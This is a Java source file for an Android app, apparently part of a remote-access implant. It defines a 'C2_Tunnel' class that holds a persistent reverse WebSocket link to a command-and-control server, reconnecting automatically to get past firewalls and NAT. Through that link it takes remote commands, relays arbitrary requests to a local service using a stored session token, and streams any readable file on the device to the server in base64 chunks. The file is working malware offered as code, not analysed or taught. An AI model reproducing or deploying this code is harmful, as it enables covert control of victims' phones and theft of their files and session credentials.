package com.labs.labrats;

import android.content.Context;
import android.util.Base64;
import android.util.Log;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;
import okio.ByteString;

/**
 * Tactical Reverse WebSocket Tunnel Engine with Binary Streaming & Exponential Reconnect Backoff.
 * Allows C2 communication across strict NATs/Firewalls without public ports.
 */
public class C2_Tunnel {

    private static final String TAG = "C2_Tunnel";
    private static final int CHUNK_SIZE = 32 * 1024; // 32KB Binary Chunk Size to avoid OOM
    private static final ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();

    private static WebSocket webSocket;
    private static OkHttpClient client;
    private static boolean isConnecting = false;
    private static final AtomicInteger reconnectAttempts = new AtomicInteger(0);

    public static synchronized void start(Context context) {
        if (webSocket != null || isConnecting) {
            Log.d(TAG, "Tunnel pulse active or connecting. Skipping duplicate start.");
            return;
        }

        String c2Url = BuildConfig.WEBHOOK_URL;
        if (c2Url == null || c2Url.trim().isEmpty()) {
            return;
        }

        String deviceId = C2_Uploader.getDeviceId(context);
        String wsUrl = c2Url.replace("http://", "ws://").replace("https://", "wss://") + "/tunnel?deviceId=" + deviceId;

        isConnecting = true;
        Log.d(TAG, "Initiating Reverse Proxy Uplink: " + wsUrl);

        if (client == null) {
            client = new OkHttpClient.Builder()
                    .connectTimeout(20, TimeUnit.SECONDS)
                    .readTimeout(0, TimeUnit.MILLISECONDS)
                    .writeTimeout(0, TimeUnit.MILLISECONDS)
                    .pingInterval(30, TimeUnit.SECONDS)
                    .retryOnConnectionFailure(true)
                    .build();
        }

        Request request = new Request.Builder()
                .url(wsUrl)
                .build();

        webSocket = client.newWebSocket(request, new WebSocketListener() {
            @Override
            public void onOpen(WebSocket ws, Response response) {
                isConnecting = false;
                reconnectAttempts.set(0); // Reset backoff counter on successful connection
                Log.d(TAG, "TUNNEL_ESTABLISHED: Reverse proxy link connected.");
                FirebaseConfig.logActivity("TUNNEL_SYNC: Reverse WebSocket proxy connected to C2.");
            }

            @Override
            public void onMessage(WebSocket ws, String text) {
                handleCommand(context, text);
            }

            @Override
            public void onMessage(WebSocket ws, ByteString bytes) {
                Log.d(TAG, "Received binary payload frame of " + bytes.size() + " bytes.");
            }

            @Override
            public void onClosing(WebSocket ws, int code, String reason) {
                ws.close(1000, null);
            }

            @Override
            public void onFailure(WebSocket ws, Throwable t, Response response) {
                isConnecting = false;
                webSocket = null;
                Log.e(TAG, "TUNNEL_FAILURE: " + t.getMessage());
                scheduleReconnect(context);
            }
        });
    }

    private static void scheduleReconnect(Context context) {
        int attempt = reconnectAttempts.incrementAndGet();
        // Exponential backoff: 2s, 4s, 8s, 16s, capped at 60s
        long delaySeconds = Math.min(60, (long) Math.pow(2, Math.min(attempt, 6)));
        // Jitter: +/- 20%
        long jitter = (long) (delaySeconds * 0.2 * (Math.random() * 2 - 1));
        long finalDelay = Math.max(2, delaySeconds + jitter);

        Log.d(TAG, "Scheduling tunnel reconnect in " + finalDelay + "s (Attempt #" + attempt + ")");
        scheduler.schedule(() -> start(context), finalDelay, TimeUnit.SECONDS);
    }

    private static void handleCommand(Context context, String json) {
        try {
            JSONObject cmd = new JSONObject(json);
            String type = cmd.optString("type");
            String requestId = cmd.optString("id");

            if ("request".equals(type)) {
                String path = cmd.optString("path");
                String method = cmd.optString("method", "GET");
                String body = cmd.optString("body", "");

                LabRatsWorker.execute(() -> relayLocalRequest(method, path, body, requestId));
            } else if ("stream_file".equals(type)) {
                String filePath = cmd.optString("filePath");
                LabRatsWorker.execute(() -> streamFileChunks(filePath, requestId));
            }
        } catch (Exception e) {
            Log.e(TAG, "Cmd Error: " + e.getMessage());
        }
    }

    private static void relayLocalRequest(String method, String path, String body, String requestId) {
        try {
            URL url = new URL("http://127.0.0.1:" + FirebaseConfig.DEFAULT_PORT + path);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod(method);
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(15000);
            conn.setRequestProperty("Accept-Encoding", "identity");
            conn.setRequestProperty("Cookie", "token=" + WorkManager_Sync.activeSessionToken);

            if ("POST".equalsIgnoreCase(method) && !body.isEmpty()) {
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                try (java.io.OutputStream os = conn.getOutputStream()) {
                    os.write(body.getBytes(java.nio.charset.StandardCharsets.UTF_8));
                }
            }

            int code = conn.getResponseCode();
            String contentType = conn.getContentType();

            InputStream is = (code < 400) ? conn.getInputStream() : conn.getErrorStream();
            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
            byte[] data = new byte[16384];
            int nRead;
            while ((nRead = is.read(data, 0, data.length)) != -1) {
                buffer.write(data, 0, nRead);
            }

            JSONObject resp = new JSONObject();
            resp.put("type", "response");
            resp.put("id", requestId);
            resp.put("status", code);
            resp.put("contentType", contentType);
            resp.put("payload", Base64.encodeToString(buffer.toByteArray(), Base64.NO_WRAP));

            if (webSocket != null) {
                webSocket.send(resp.toString());
            }

        } catch (Exception e) {
            Log.e(TAG, "Relay Error: " + e.getMessage());
        }
    }

    /**
     * Binary Chunked File Streaming over WebSocket to prevent OutOfMemoryError on large files.
     */
    public static void streamFileChunks(String filePath, String requestId) {
        if (filePath == null || webSocket == null) return;
        File file = new File(filePath);
        if (!file.exists() || !file.canRead()) {
            Log.e(TAG, "Stream File Error: File not accessible " + filePath);
            return;
        }

        try (FileInputStream fis = new FileInputStream(file)) {
            byte[] buffer = new byte[CHUNK_SIZE];
            int bytesRead;
            int chunkIndex = 0;
            long totalBytes = file.length();
            int totalChunks = (int) Math.ceil((double) totalBytes / CHUNK_SIZE);

            while ((bytesRead = fis.read(buffer)) != -1) {
                JSONObject chunkHeader = new JSONObject();
                chunkHeader.put("type", "file_chunk");
                chunkHeader.put("id", requestId);
                chunkHeader.put("fileName", file.getName());
                chunkHeader.put("chunkIndex", chunkIndex);
                chunkHeader.put("totalChunks", totalChunks);
                chunkHeader.put("bytesRead", bytesRead);
                chunkHeader.put("data", Base64.encodeToString(buffer, 0, bytesRead, Base64.NO_WRAP));

                webSocket.send(chunkHeader.toString());
                chunkIndex++;
            }

            JSONObject endHeader = new JSONObject();
            endHeader.put("type", "file_complete");
            endHeader.put("id", requestId);
            endHeader.put("fileName", file.getName());
            webSocket.send(endHeader.toString());

            Log.d(TAG, "Successfully streamed file " + file.getName() + " in " + totalChunks + " chunks.");
        } catch (Exception e) {
            Log.e(TAG, "Stream file chunk error: " + e.getMessage());
        }
    }

    public static synchronized void stop() {
        if (webSocket != null) {
            webSocket.close(1000, "Shutdown");
            webSocket = null;
        }
        isConnecting = false;
    }
}
